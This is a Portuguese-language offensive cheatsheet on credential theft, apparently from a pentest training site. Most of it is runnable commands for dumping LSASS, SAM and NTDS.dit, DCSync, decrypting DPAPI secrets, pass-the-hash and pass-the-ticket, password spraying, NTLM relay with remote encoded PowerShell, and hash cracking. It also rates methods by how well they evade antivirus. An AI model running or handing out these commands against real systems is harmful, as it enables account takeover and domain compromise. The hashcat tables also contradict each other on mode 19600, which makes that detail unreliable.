---
layout: cyber
section: cheatsheets
title: "Credenciais — Cheatsheet Completo"
---

# Credenciais — Cheatsheet Completo

> Dump, cracking, pass-the-hash, pass-the-ticket, localização de credenciais.
> Organizado por técnica com comparações lado-a-lado.

---

## Tabela Comparativa: Métodos de Dump do LSASS

| Método | Ferramenta | Requer Admin | OPSEC | Detectado por AV | Artefatos em Disco | Observações |
|--------|-----------|--------------|-------|------------------|--------------------|-------------|
| Task Manager | Windows nativo | Sim | ★☆☆☆☆ | Sim | .DMP em disco | Só laboratório |
| ProcDump | Sysinternals | Sim | ★★☆☆☆ | Sim | .DMP em disco | Muito detectado |
| comsvcs.dll MiniDump | LOLBin | Sim | ★★☆☆☆ | Às vezes | .DMP em disco | Via rundll32 |
| Mimikatz sekurlsa | Mimikatz | Sim + Debug | ★★☆☆☆ | Sim | Sem dump | Assinatura conhecida |
| nanodump | nanodump | Sim | ★★★★☆ | Raramente | .DMP minificado | Dump furtivo |
| PPLdump | PPLdump | Sim | ★★★☆☆ | Ocasional | Sem disco | Para LSASS com PPL |
| Handlekatz | Handlekatz | Sim | ★★★★☆ | Raramente | Sem dump em disco | Via handle roubado |
| SilentProcessExit | LOLBin | Sim | ★★★☆☆ | Raramente | .DMP em disco | Via registry + WerFault |
| Vol Shadow Copy | Windows nativo | Sim | ★★★★☆ | Não | Nenhum | SAM/NTDS — não LSASS |
| Secretsdump remoto | Impacket | DA ou creds | ★★★☆☆ | Não | Nenhum no alvo | Executa no Kali |
| BYOVD + driver | EDRSandblast | Admin + kernel | ★★★★★ | Não | Driver temporário | Ver módulo 11 |

**Escala OPSEC:** ★☆☆☆☆ = muito barulhento / ★★★★★ = muito silencioso

---

## Dump do LSASS

### comsvcs.dll MiniDump (LOLBin — sem ferramentas extras)

```powershell
# Encontrar PID do lsass:
Get-Process lsass

# Dump via rundll32 (LOLBin):
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full

# Via CMD:
for /f "tokens=2 delims= " %i in ('tasklist ^| findstr lsass') do rundll32.exe comsvcs.dll MiniDump %i C:\Temp\lsass.dmp full

# One-liner PowerShell:
rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full;Wait-Process -Id (Get-Process rundll32).id
```

### ProcDump (Sysinternals)

```cmd
:: Download procdump de sysinternals.com

:: Dump básico:
procdump.exe -ma lsass.exe C:\Temp\lsass.dmp

:: Via PID:
procdump.exe -ma 752 C:\Temp\lsass.dmp

:: Tentar bypass PPL com clone:
procdump.exe -r -ma lsass.exe C:\Temp\lsass.dmp
```

### nanodump (Dump Furtivo com Tamanho Reduzido)

```bash
# Execute-assembly via Cobalt Strike:
execute-assembly /path/to/nanodump.exe --write C:\Windows\Temp\creds

# Versão BOF (sem processo filho — mais furtiva):
# Carregar via aggressor e usar inline no beacon

# Parsear o dump no Kali:
pypykatz lsa minidump lsass.dmp
```

### Parsear Dump com Pypykatz (Kali)

```bash
# Instalar:
pip3 install pypykatz

# Parsear:
pypykatz lsa minidump lsass.dmp

# Filtrar hashes NT:
pypykatz lsa minidump lsass.dmp | grep -E "nt:|password:"

# Saída detalhada para arquivo:
pypykatz lsa minidump lsass.dmp -o resultados.json
```

### WDigest — Forçar Cleartext (Windows 8.1+)

```powershell
# Habilitar WDigest (aguardar re-logon do usuário):
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Verificar:
(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest).UseLogonCredential

# Após logon do usuário alvo, Mimikatz mostra cleartext:
sekurlsa::logonpasswords  # Campo "password" terá senha em texto
```

---

## SAM Database (Contas Locais)

Sempre disponível — mesmo com Credential Guard ativo.

```powershell
# reg save (como SYSTEM):
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Copiar para Kali e parsear:
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Via Volume Shadow Copy:
$vss = (Get-WmiObject Win32_ShadowCopy)[0]
$vssPath = $vss.DeviceObject + "\"
cmd /c copy "$vssPath\Windows\System32\config\SAM" C:\Temp\SAM_shadow
cmd /c copy "$vssPath\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM_shadow

# Mimikatz local:
privilege::debug
lsadump::sam

# Impacket remoto:
secretsdump.py DOMAIN/admin:pass@TARGET_IP
secretsdump.py -hashes :NTHASH DOMAIN/admin@TARGET_IP
```

---

## DCSync

```bash
# Impacket — remoto do Kali (requer DA ou DCSync perms):
secretsdump.py DOMAIN.COM/da:password@DC_IP -just-dc
secretsdump.py DOMAIN.COM/da:password@DC_IP -just-dc-user krbtgt
secretsdump.py DOMAIN.COM/da:password@DC_IP -just-dc-user administrator

# Com hash NT (PtH):
secretsdump.py -hashes :DA_NTHASH DOMAIN.COM/da@DC_IP -just-dc

# Via ticket Kerberos:
export KRB5CCNAME=da.ccache
secretsdump.py -k -no-pass DOMAIN.COM/da@DC.DOMAIN.COM -just-dc

# Salvar output:
secretsdump.py DOMAIN.COM/da:pass@DC_IP -just-dc -outputfile dcsync_output
```

```powershell
# Mimikatz local (no DC ou com token DA):
privilege::debug
lsadump::dcsync /domain:DOMAIN.COM /user:krbtgt
lsadump::dcsync /domain:DOMAIN.COM /user:DOMAIN\Administrator
lsadump::dcsync /domain:DOMAIN.COM /all /csv

# CrackMapExec:
cme smb DC_IP -u admin -p pass --ntds          # Via VSS
cme smb DC_IP -u admin -p pass --ntds drsuapi  # Via DCSync API

# Cobalt Strike beacon:
dcsync DOMAIN.COM DOMAIN\krbtgt
```

---

## DPAPI

```powershell
# SharpDPAPI — secretos DPAPI:
.\SharpDPAPI.exe triage                   # Visão geral
.\SharpDPAPI.exe credentials              # Credential Manager
.\SharpDPAPI.exe vaults                   # Windows Vault
.\SharpDPAPI.exe masterkeys /target:C:\Users\user\AppData\Roaming\Microsoft\Protect\
.\SharpDPAPI.exe certificates             # Certificados com chave privada
.\SharpDPAPI.exe browser /target:chrome   # Senhas do Chrome/Edge
.\SharpDPAPI.exe blob /target:blob.bin /unprotect

# Mimikatz:
privilege::debug
sekurlsa::dpapi                           # Masterkeys do lsass
dpapi::masterkey /in:mk_file /rpc         # Via DC backup key
dpapi::backupkeys /system:DC /export      # Exportar domain backup key

# Com backup key — descriptografar qualquer masterkey do domínio:
dpapi::masterkey /in:mk_file /pvk:ntds_backup_*.pvk

# Impacket:
dpapi.py masterkeys -file mk_file -sid S-1-5-21-... -key "hex_key"
dpapi.py credential -file cred_file -key hex_masterkey
dpapi.py wifi -file wifi_xml_file
```

---

## Cached Domain Credentials (DCC2)

```bash
# secretsdump:
secretsdump.py DOMAIN/admin:pass@TARGET_IP
# Seção: [*] Dumping cached domain logon information (domain/username:hash)

# Mimikatz:
privilege::debug
lsadump::cache

# CrackMapExec:
cme smb TARGET -u admin -p pass --lsa

# Crackear DCC2 (hashcat modo 2100 — muito lento por design):
hashcat -m 2100 '$DCC2$10240#alice#aabbcc...' /usr/share/wordlists/rockyou.txt
# ~1000 tentativas/s em GPU potente
```

---

## Pass-the-Hash (PtH)

### Tabela Comparativa de Ferramentas PtH

| Ferramenta | Protocolo | Shell? | Detectabilidade | Observações |
|-----------|-----------|--------|----------------|-------------|
| psexec.py | SMB | Sim (SYSTEM) | Alta | Cria serviço — barulhento |
| smbexec.py | SMB | Sim | Média | Serviço diferente |
| wmiexec.py | WMI | Sim | Média | Semi-interativo |
| atexec.py | Task Scheduler | Output | Baixa | Sem shell interativo |
| evil-winrm | WinRM | Sim | Média | Porta 5985/5986 |
| xfreerdp | RDP | Sim (GUI) | Média | Restricted Admin mode |
| CrackMapExec | SMB/WMI | Opcional | Média | Varredura de rede |

### Comandos Completos PtH

```bash
# psexec.py (Impacket)
psexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP
psexec.py -hashes LM:NTHASH DOMAIN/user@TARGET_IP
psexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP cmd.exe

# smbexec.py (menos barulhento)
smbexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP
smbexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP -service-name legit_svc

# wmiexec.py
wmiexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP
wmiexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP "whoami"

# evil-winrm
evil-winrm -i TARGET_IP -u administrator -H NTHASH
evil-winrm -i TARGET_IP -u 'DOMAIN\user' -H NTHASH

# xfreerdp (Restricted Admin mode)
xfreerdp /v:TARGET_IP /u:administrator /pth:NTHASH /cert-ignore /dynamic-resolution

# CrackMapExec / NetExec
cme smb TARGET_IP -u administrator -H NTHASH
cme smb 192.168.1.0/24 -u administrator -H NTHASH --shares
cme smb TARGET_IP -u administrator -H NTHASH -x "whoami"
cme winrm TARGET_IP -u user -H NTHASH
netexec smb TARGET_IP -u administrator -H NTHASH  # Alias moderno

# Mimikatz (abre nova sessão local):
privilege::debug
sekurlsa::pth /user:administrator /domain:DOMAIN.COM /ntlm:NTHASH /run:cmd.exe
```

---

## Pass-the-Ticket (PtT)

```bash
# Linux — usar ccache:
export KRB5CCNAME=/path/to/ticket.ccache
klist  # Verificar

# Usar com impacket:
psexec.py -k -no-pass DOMAIN.COM/user@TARGET.DOMAIN.COM
wmiexec.py -k -no-pass DOMAIN.COM/user@TARGET.DOMAIN.COM
secretsdump.py -k -no-pass DOMAIN.COM/user@DC.DOMAIN.COM
smbclient.py -k -no-pass //TARGET/C$

# Converter kirbi → ccache:
ticketConverter.py ticket.kirbi ticket.ccache
# ou:
impacket-ticketConverter ticket.kirbi ticket.ccache
```

```powershell
# Windows — Rubeus:
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe ptt /ticket:BASE64_DO_TICKET
klist  # Verificar

# Mimikatz:
kerberos::ptt ticket.kirbi
kerberos::ptt BASE64
klist

# Limpar tickets:
.\Rubeus.exe purge
kerberos::purge
klist purge
```

---

## Hashcat — Referência de Modos

| Modo | Tipo | Velocidade (GPU) | Quando Usar |
|------|------|-----------------|-------------|
| `1000` | NT Hash (NTLM) | ~100B/s | Hashes de secretsdump/SAM |
| `5600` | NTLMv2 (Net-NTLMv2) | ~5B/s | Hashes do Responder |
| `5500` | NTLMv1 | ~100B/s | Hashes legados |
| `13100` | TGS-REP RC4 (Kerberoast) | ~5B/s | Kerberoasting etype 23 |
| `19600` | TGS-REP AES128 | ~500K/s | Kerberoasting etype 17 |
| `19700` | TGS-REP AES256 | ~300K/s | Kerberoasting etype 18 |
| `18200` | AS-REP RC4 (AS-REP Roast) | ~5B/s | AS-REP Roasting |
| `2100` | DCC2 (cached domain) | ~1K/s | Domain cached credentials |
| `1800` | SHA-512 crypt | ~10M/s | Linux /etc/shadow |
| `500` | MD5 crypt | ~100M/s | Linux /etc/shadow legado |

```bash
# Comandos hashcat:
hashcat -m 1000 ntlm.txt rockyou.txt                               # Dictionary
hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule         # Com regras
hashcat -m 5600 ntlmv2.txt rockyou.txt                             # NTLMv2
hashcat -m 13100 tgs.txt rockyou.txt                               # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt                             # AS-REP
hashcat -m 2100 dcc2.txt rockyou.txt                               # Cached

# Verificar resultados:
hashcat -m 1000 --show ntlm.txt

# John the Ripper equivalentes:
john --wordlist=rockyou.txt --format=NT hashes.txt
john --wordlist=rockyou.txt --format=netntlmv2 ntlmv2.txt
john --wordlist=rockyou.txt --format=krb5tgs tgs.txt
john --wordlist=rockyou.txt --format=krb5asrep asrep.txt
john --show hashes.txt
```

---

## Localização de Arquivos de Credenciais

### Windows

```
SAM e hashes locais:
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY

NTDS.dit (Domain Controller):
C:\Windows\NTDS\NTDS.dit

Credential Manager:
C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\
C:\Users\USERNAME\AppData\Roaming\Microsoft\Credentials\

DPAPI Masterkeys:
C:\Users\USERNAME\AppData\Roaming\Microsoft\Protect\SID\*
C:\Windows\System32\Microsoft\Protect\

Certificados (chave privada):
C:\Users\USERNAME\AppData\Roaming\Microsoft\SystemCertificates\My\Keys\

Browser (Chrome/Edge) — SQLite:
C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data
C:\Users\USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

Wi-Fi (senhas):
C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\*.xml
netsh wlan show profile name="REDE" key=clear

PowerShell history:
C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Unattend.xml (cleartext frequente):
C:\Windows\Panther\Unattend.xml
C:\Windows\System32\sysprep\sysprep.xml

RDP salvo:
HKCU:\Software\Microsoft\Terminal Server Client\Servers\

PuTTY sessions:
HKCU:\Software\SimonTatham\PuTTY\Sessions\
```

### Linux

```bash
# Senhas e shadow:
/etc/passwd
/etc/shadow
/etc/group

# SSH keys:
~/.ssh/id_rsa
~/.ssh/id_ed25519
/root/.ssh/id_rsa

# Histórico de comandos:
~/.bash_history
~/.zsh_history
/root/.bash_history

# Configs de aplicação com credenciais:
/var/www/html/wp-config.php          # WordPress
/etc/mysql/my.cnf                    # MySQL
~/.my.cnf                            # MySQL local
/opt/*/config.*
/srv/*/config.*

# Variáveis de ambiente de processos:
cat /proc/1/environ | tr '\0' '\n'

# Docker:
~/.docker/config.json

# Buscar credenciais em arquivos:
grep -rni "password" /var/www/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

---

## Password Spray e Enumeração

```bash
# Kerbrute — spray via Kerberos (menos lockout):
kerbrute passwordspray -d DOMAIN.COM --dc DC_IP users.txt 'Password123'
kerbrute userenum -d DOMAIN.COM --dc DC_IP users.txt
kerbrute bruteuser -d DOMAIN.COM --dc DC_IP passwords.txt alice

# CrackMapExec spray:
cme smb DC_IP -u users.txt -p passwords.txt --no-bruteforce  # Cada user com cada senha
cme smb DC_IP -u users.txt -p 'Password123'                   # Uma senha para todos

# Responder — capturar NTLMv2:
sudo responder -I eth0 -wrf
# Hashes em: /usr/share/responder/logs/

# ntlmrelayx — relay de hashes:
sudo ntlmrelayx.py -tf targets.txt -smb2support
sudo ntlmrelayx.py -t ldap://DC_IP --delegate-access  # RBCD via relay

# Snaffler — encontrar credenciais em shares:
.\Snaffler.exe -s -d DOMAIN.COM -o snaffler.log
```

---

## Referencia Rapida — Comandos Diretos

### LSASS — Mimikatz completo

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::tickets
sekurlsa::ekeys
sekurlsa::msv
```

### SAM Online — reg save

```cmd
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
reg save HKLM\SECURITY C:\security
```

```bash
secretsdump.py -sam sam -system system LOCAL
secretsdump.py -sam sam -system system -security security LOCAL
```

### NTDS.dit via VSS

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
reg save HKLM\SYSTEM C:\system.hiv
```

```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL -just-dc-ntlm
```

### LSA Secrets — Mimikatz e Secretsdump

```
lsadump::secrets
lsadump::cache
```

```bash
secretsdump.py domain.local/Administrator:Password@DC01 -just-dc
secretsdump.py domain.local/Administrator:Password@DC01 -just-dc-ntlm
```

### LAPS — Leitura de Senha

```powershell
Get-DomainObject -Identity COMPUTERNAME -Properties ms-Mcs-AdmPwd
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_."ms-Mcs-AdmPwd"} | Select Name,'ms-Mcs-AdmPwd'
```

```bash
crackmapexec ldap DC01 -u user -p pass -M laps
```

### Responder + Relay Completo

```bash
# /etc/responder/Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -wF
ntlmrelayx.py -t smb://TARGET --no-http-server -smb2support
ntlmrelayx.py -t smb://TARGET --no-http-server -smb2support -c "powershell -enc BASE64"

# NTLMv2 crack
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt rockyou.txt
```

### ProcDump + comsvcs.dll + Nanodump

```cmd
procdump64.exe -ma lsass.exe lsass.dmp
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\Windows\Temp\lsass.dmp full
nanodump --write C:\Windows\Temp\lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```

### Pass-the-Hash — Impacket + CME + Mimikatz

```bash
psexec.py domain.local/Administrator@TARGET -hashes :NTLM_HASH
wmiexec.py domain.local/Administrator@TARGET -hashes :NTLM_HASH
crackmapexec smb TARGET -u Administrator -H NTLM_HASH
crackmapexec smb TARGET -u Administrator -H NTLM_HASH -x "whoami"
```

```
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe
```

### Modos Hashcat — Referencia Final

| Modo  | Tipo                  |
|-------|-----------------------|
| 1000  | NTLM                  |
| 2100  | DCC2 (MSCachev2)      |
| 5600  | NTLMv2                |
| 13100 | Kerberoast RC4        |
| 18200 | AS-REP Roast          |
| 19600 | Kerberoast AES256     |
| 22000 | WPA2                  |
